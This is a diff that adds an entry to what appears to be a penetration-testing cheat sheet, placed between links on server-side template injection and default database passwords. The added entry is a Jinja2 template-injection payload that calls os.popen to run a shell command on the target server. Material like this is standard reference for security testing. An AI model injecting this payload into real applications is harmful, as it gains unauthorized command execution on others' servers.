@@ -48,6 +48,12 @@ dig <example.com> TXT
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 
+Jinja2
+
+```
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+```
+
 ## Databases
 
 - Default Passwords: https://cirt.net/passwords
